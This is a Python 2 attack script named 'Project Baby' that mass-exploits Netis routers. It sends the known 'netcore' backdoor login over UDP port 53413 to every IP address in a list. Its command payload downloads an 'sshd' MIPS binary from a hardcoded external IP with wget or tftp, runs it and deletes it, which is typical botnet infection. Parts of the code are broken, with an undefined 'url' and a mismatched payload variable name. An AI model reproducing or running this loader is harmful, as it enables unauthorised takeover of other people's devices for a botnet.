#!/usr/bin/python



#----------------------------------------------------------#
"""
  _____           _           _     ____        _           
 |  __ \         (_)         | |   |  _ \      | |          
 | |__) | __ ___  _  ___  ___| |_  | |_) | __ _| |__  _   _ 
 |  ___/ '__/ _ \| |/ _ \/ __| __| |  _ < / _` | '_ \| | | |
 | |   | | | (_) | |  __/ (__| |_  | |_) | (_| | |_) | |_| |
 |_|   |_|  \___/| |\___|\___|\__| |____/ \__,_|_.__/ \__, |
                _/ |                                   __/ |
               |__/                                   |___/ 
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

   "Project Baby" is a netis list bruteforcer.
   - - - - - - - - - - - - - - - - - - - - -
      - - - - - - Output - - - - - - -
	  python project_baby.py 500 ssh.txt
	- - - - - - - - - - - - - - - - - - - - -
	"list.txt" should be stated like below;
	           69.13.37.69
	           73.28.93.29
	           118.88.29.10
	           199.288.38.28
  - - - - - - - - - - - - - - - - - - - - - - - -
            - - - Credits - - -
			
"""
#----------------------------------------------------------#

import threading, sys, time, random, socket, re, os
from Queue import *
from sys import stdout

if len(sys.argv) < 3:
        print "Usage: python "+sys.argv[0]+" <threads> <list>"
        sys.exit()

loginpayload = "AAAAAAAAnetcore\x00" #DONT CHANGE


command = "AA\x00\x00AAAA cd /var/; rm -rf sshd; wget http://185.144.82.236/sshd || tftp -r sshd -g 185.144.82.236; chmod 777 sshd; ./sshd; rm -rf sshd\x00" # MIPSEL Binary

spawn_shell = "cat | sh"
threads = int(sys.argv[1])
ips = open(sys.argv[2], "r").readlines()
ports = ["23", "22", "53413"]
queue = Queue()
qcount = 0
binary = url.split("/")
binary = binary[3]
ip = binary[2]
found = 0
count = 0

for ip in ips:
	qcount += 1
	stdout.write("\r[%d] Loaded" % qcount)
	stdout.flush()
	queue.put(ip)
print "\n"

def readUntil(tn, string, timeout=10):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.01)
        if string in buf: return buf
    raise Exception('TIMEOUT!')

def worker():
	try:
		while True:
			try:
				if queue.empty() == True:
					sys.exit(1)
				ip = queue.get()
				nn = nnetis(ip)
				nn.start()
				queue.task_done()
			except:
				pass
	except:
		pass



class nnetis(threading.Thread):
        def __init__ (self, ip):
                threading.Thread.__init__(self)
                self.ip = str(ip).rstrip('\n')
        def run(self):
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                try:
			# sends netis payload to almost everything lmao
                        s.sendto(loginpayload, (self.ip, 53413))
                        time.sleep(1)
                        s.sendto(commandpayload, (self.ip, 53413))
                        time.sleep(2)
                except Exception:
                        pass


for g in xrange(threads):
	t = threading.Thread(target=worker)
	t.setDaemon(True)
	t.start()
	
queue.join()
print "Finished!"
